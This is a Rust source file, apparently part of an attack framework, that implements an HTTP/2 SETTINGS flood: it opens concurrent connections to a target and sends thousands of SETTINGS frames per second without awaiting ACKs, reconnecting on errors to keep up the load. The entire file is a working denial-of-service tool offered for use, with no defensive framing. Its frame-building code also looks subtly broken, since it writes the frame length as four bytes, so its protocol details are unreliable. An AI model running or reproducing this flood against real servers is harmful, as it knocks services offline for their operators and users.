//! HTTP/2 SETTINGS Flood Attack
//!
//! This attack floods the target with SETTINGS frames without waiting for ACKs.
//! Each SETTINGS frame must be acknowledged by the server, consuming memory
//! and CPU resources for queue management and frame processing.
//!
//! The attack works by:
//! 1. Opening an HTTP/2 connection to the target
//! 2. Sending thousands of SETTINGS frames in rapid succession
//! 3. Not waiting for SETTINGS ACK responses
//! 4. Overwhelming the server's frame processing queue

use std::sync::Arc;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use bytes::Bytes;
use phoenix_core::RawH2Connection;
use phoenix_metrics::AttackMetrics;
use tracing::{info, warn, error};
use url::Url;

use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};

/// HTTP/2 SETTINGS Flood Attack implementation
pub struct SettingsFloodAttack {
    /// Number of SETTINGS frames to send per second
    frames_per_second: u32,
    
    /// Number of concurrent connections
    connections: usize,
    
    /// Attack duration
    duration: Duration,
}

impl SettingsFloodAttack {
    /// Create a new SettingsFloodAttack with default configuration
    pub fn new() -> Self {
        Self {
            frames_per_second: 10_000,
            connections: 5,
            duration: Duration::from_secs(30),
        }
    }
    
    /// Set the frames per second rate
    pub fn with_frames_per_second(mut self, fps: u32) -> Self {
        self.frames_per_second = fps;
        self
    }
    
    /// Set the number of concurrent connections
    pub fn with_connections(mut self, connections: usize) -> Self {
        self.connections = connections;
        self
    }
    
    /// Set the attack duration
    pub fn with_duration(mut self, duration: Duration) -> Self {
        self.duration = duration;
        self
    }
    
    /// Build a SETTINGS frame with random settings
    fn build_settings_frame(&self, frame_id: u64) -> Bytes {
        use bytes::BufMut;
        
        // Vary settings slightly each frame to avoid deduplication
        let setting_id = ((frame_id % 6) as u16 + 1) * 2; // Even IDs 2, 4, 6, 8, 10, 12
        let setting_value = (frame_id % 65536) as u32;
        
        let mut buf = bytes::BytesMut::with_capacity(15);
        
        // Frame length: 6 bytes for settings (2 bytes identifier + 4 bytes value)
        buf.put_u32(6);
        
        // Frame type: SETTINGS (0x04)
        buf.put_u8(0x04);
        
        // Flags: ACK=0
        buf.put_u8(0x00);
        
        // Stream identifier: 0 for settings
        buf.put_u32(0);
        
        // Setting: random ID and value
        buf.put_u16(setting_id);
        buf.put_u32(setting_value);
        
        buf.freeze()
    }
}

#[async_trait]
impl Attack for SettingsFloodAttack {
    fn name(&self) -> &str {
        "http2-settings-flood"
    }
    
    fn description(&self) -> &str {
        "HTTP/2 SETTINGS Flood Attack. Sends thousands of SETTINGS frames without waiting for ACKs, forcing the server to queue and acknowledge each frame, consuming memory and CPU resources."
    }
    
    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        info!("Starting HTTP/2 SETTINGS Flood Attack against {}", ctx.target);
        
        let (target_host, target_port) = parse_target(&ctx.target)?;
        
        // Use context values if provided, otherwise use struct defaults
        let frames_per_second = ctx.extra.get("frames_per_second")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.frames_per_second);
        let connections = if ctx.connections > 0 { ctx.connections } else { self.connections };
        let duration = if ctx.duration.as_secs() > 0 { ctx.duration } else { self.duration };
        
        info!("Configuration: {} connections, {} FPS, duration: {:?}", 
              connections, frames_per_second, duration);
        
        let metrics = ctx.metrics.clone();
        let start_time = Instant::now();
        
        // Calculate interval between frames
        let interval_ns = 1_000_000_000 / frames_per_second as u64;
        let interval = Duration::from_nanos(interval_ns);
        
        // Launch attack tasks
        let mut tasks = Vec::new();
        for conn_idx in 0..connections {
            let target_host = target_host.clone();
            let metrics = metrics.clone();
            let start_time = start_time;
            let duration = duration;
            let interval = interval;
            
            let task = tokio::spawn(async move {
                let mut total_frames = 0u64;
                let mut errors = 0u64;
                
                // Connect to target - construct URL from host and port
                let url_str = format!("https://{}:{}", target_host, target_port);
                let url = match Url::parse(&url_str) {
                    Ok(url) => url,
                    Err(e) => {
                        error!("Invalid URL for connection {}: {}", conn_idx, e);
                        return (0, 1);
                    }
                };
                
                let mut connection = match RawH2Connection::connect(&url).await {
                    Ok(conn) => conn,
                    Err(e) => {
                        error!("Connection {} failed to connect: {}", conn_idx, e);
                        return (0, 1);
                    }
                };
                
                // Perform handshake
                if let Err(e) = connection.perform_handshake().await {
                    error!("Connection {} handshake failed: {}", conn_idx, e);
                    return (0, 1);
                }
                
                info!("Connection {} ready for SETTINGS flood", conn_idx);
                
                let mut frame_id = 0u64;
                let mut next_frame_time = start_time;
                
                // Flood loop
                while start_time.elapsed() < duration {
                    let now = Instant::now();
                    
                    // Send frames at the target rate
                    if now >= next_frame_time {
                        let attack = SettingsFloodAttack::new();
                        let settings_frame = attack.build_settings_frame(frame_id);
                        frame_id += 1;
                        
                        match connection.send_frame(settings_frame).await {
                            Ok(_) => {
                                total_frames += 1;
                                metrics.record_request(0, true, 0).await;
                                
                                // Update next frame time
                                next_frame_time += interval;
                                
                                // If we've fallen behind, catch up gradually
                                if next_frame_time < now {
                                    next_frame_time = now + interval;
                                }
                            }
                            Err(e) => {
                                error!("Connection {} failed to send SETTINGS frame: {}", conn_idx, e);
                                errors += 1;
                                
                                // Try to reconnect
                                let url_str = format!("https://{}:{}", target_host, target_port);
                                let url = match Url::parse(&url_str) {
                                    Ok(url) => url,
                                    Err(e) => {
                                        error!("Invalid URL during reconnection: {}", e);
                                        break;
                                    }
                                };
                                
                                match RawH2Connection::connect(&url).await {
                                    Ok(new_conn) => {
                                        connection = new_conn;
                                        if let Err(e) = connection.perform_handshake().await {
                                            error!("Reconnection handshake failed: {}", e);
                                            break;
                                        }
                                        info!("Connection {} reconnected", conn_idx);
                                    }
                                    Err(e) => {
                                        error!("Reconnection failed: {}", e);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    
                    // Small yield to prevent starving the runtime
                    if total_frames % 1000 == 0 {
                        tokio::task::yield_now().await;
                    }
                    
                    // Sleep briefly if we're ahead of schedule
                    if next_frame_time > now {
                        let sleep_duration = next_frame_time.duration_since(now);
                        if sleep_duration > Duration::from_micros(100) {
                            tokio::time::sleep(Duration::from_micros(100)).await;
                        }
                    }
                }
                
                info!("Connection {} completed: {} frames, {} errors", 
                      conn_idx, total_frames, errors);
                
                (total_frames, errors)
            });
            
            tasks.push(task);
        }
        
        // Collect results
        let mut total_frames = 0u64;
        let mut total_errors = 0u64;
        
        for task in tasks {
            match task.await {
                Ok((frames, errors)) => {
                    total_frames += frames;
                    total_errors += errors;
                }
                Err(e) => {
                    error!("Task panicked: {}", e);
                    total_errors += 1;
                }
            }
        }
        
        let actual_duration = start_time.elapsed();
        let snapshot = metrics.snapshot().await;
        
        // Calculate actual FPS
        let actual_fps = if actual_duration.as_secs() > 0 {
            total_frames as f64 / actual_duration.as_secs_f64()
        } else {
            0.0
        };
        
        info!("SETTINGS flood completed:");
        info!("  Total frames: {}", total_frames);
        info!("  Total errors: {}", total_errors);
        info!("  Target FPS: {}", frames_per_second);
        info!("  Actual FPS: {:.1}", actual_fps);
        info!("  Duration: {:?}", actual_duration);
        
        Ok(AttackResult {
            success: true,
            total_requests: total_frames,
            errors: total_errors,
            duration: actual_duration,
            snapshot,
        })
    }
}

impl Default for SettingsFloodAttack {
    fn default() -> Self {
        Self::new()
    }
}